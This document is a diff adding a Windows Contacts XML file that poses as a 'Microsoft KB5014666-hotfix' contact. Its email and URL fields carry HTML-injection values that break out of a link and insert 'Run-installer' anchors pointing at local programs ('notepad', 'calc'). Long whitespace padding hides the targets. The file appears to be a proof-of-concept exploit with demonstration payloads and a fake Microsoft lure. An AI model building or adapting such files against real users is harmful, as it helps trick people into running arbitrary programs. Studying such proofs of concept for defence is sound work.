@@ -1,0 +1,79 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<c:contact c:Version="1" xmlns:c="http://schemas.microsoft.com/Contact" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:MSP2P="http://schemas.microsoft.com/Contact/Extended/MSP2P">
+	<c:CreationDate>2022-07-25T09:36:02Z</c:CreationDate>
+	<c:Extended xsi:nil="true"/>
+	<c:ContactIDCollection>
+	<c:ContactID c:ElementID="9a2577c2-9a66-41d6-9f14-49852cc48dd7">
+	<c:Value>4b736c6d-6b7e-40bf-8283-6dbd3ff7625e</c:Value>
+	</c:ContactID>
+	</c:ContactIDCollection>
+	<c:EmailAddressCollection>
+	<c:EmailAddress c:ElementID="5a3cc15b-4d87-4d59-941d-c3bb00fbdbf4">
+	<c:Type>SMTP</c:Type>
+	<c:Address>"&gt;&lt;/a&gt;&lt;a href="notepad"&gt;Run-installer                                                                                                                                                   &lt;/a&gt;</c:Address>
+	<c:LabelCollection>
+	<c:Label>Preferred</c:Label>
+	</c:LabelCollection>
+	</c:EmailAddress>
+	<c:EmailAddress c:ElementID="43535317-ca41-42ac-b265-7ecc0e83749e" xsi:nil="true"/>
+	</c:EmailAddressCollection>
+	<c:NameCollection>
+	<c:Name c:ElementID="be69f1ad-c3e5-4387-9652-e45e9867dac0">
+	<c:NickName>Microsoft KB5014666-hotfix</c:NickName>
+	<c:FormattedName>Microsoft</c:FormattedName>
+	<c:FamilyName>Microsoft</c:FamilyName>
+	</c:Name>
+	</c:NameCollection>
+	<c:PhoneNumberCollection>
+	<c:PhoneNumber c:ElementID="34a05b5a-9e28-47ed-b3f9-57115415ac04">
+	<c:Number>000-000-0000</c:Number>
+	<c:LabelCollection>
+	<c:Label>Voice</c:Label>
+	<c:Label>Business</c:Label>
+	</c:LabelCollection>
+	</c:PhoneNumber>
+	<c:PhoneNumber c:ElementID="bb8385f6-68c1-492e-8cd0-80d1b1fcdada">
+	<c:Number>000-000-0000</c:Number>
+	<c:LabelCollection>
+	<c:Label>Cellular</c:Label>
+	</c:LabelCollection>
+	</c:PhoneNumber>
+	<c:PhoneNumber c:ElementID="f62869a0-ca0b-4233-9936-b1be92dabc98">
+	<c:Number>000-000-0000</c:Number>
+	<c:LabelCollection>
+	<c:Label>Voice</c:Label>
+	<c:Label>Personal</c:Label>
+	</c:LabelCollection>
+	</c:PhoneNumber>
+	</c:PhoneNumberCollection>
+	<c:UrlCollection>
+	<c:Url c:ElementID="fbe4f21e-db94-4ea1-8933-49d6b2b20356">
+	<c:Value>"&gt;&lt;/a&gt;&lt;a href="calc"&gt;Run-installer                                                                                                                                                                                                                                                                                                                                                                             &lt;/a&gt;</c:Value>
+	<c:LabelCollection>
+	<c:Label>Business</c:Label>
+	</c:LabelCollection>
+	</c:Url>
+	<c:Url c:ElementID="234d8dc8-3da7-4568-bc90-77c099103cc6">
+	<c:Value>"&gt;&lt;/a&gt;&lt;a href="notepad"&gt;Run-installer                                                                                                                                                                                                                                                                                                                                                                              &lt;/a&gt;</c:Value>
+	<c:LabelCollection>
+	<c:Label>Personal</c:Label>
+	</c:LabelCollection>
+	</c:Url>
+	</c:UrlCollection>
+	<c:PositionCollection>
+	<c:Position c:ElementID="6e12aa50-45f2-4cb2-a77f-c76ae07abbee">
+	<c:JobTitle>Microsoft Hotfix</c:JobTitle>
+	<c:Company>Microsoft Corporation</c:Company>
+	<c:LabelCollection>
+	<c:Label>Business</c:Label>
+	</c:LabelCollection>
+	</c:Position>
+	</c:PositionCollection>
+	<c:PhotoCollection>
+	<c:Photo c:ElementID="91c2697c-dbc7-4a35-9d24-b016b1f2a877">
+	<c:LabelCollection>
+	<c:Label>UserTile</c:Label>
+	</c:LabelCollection>
+	</c:Photo>
+	</c:PhotoCollection>
+	</c:contact>
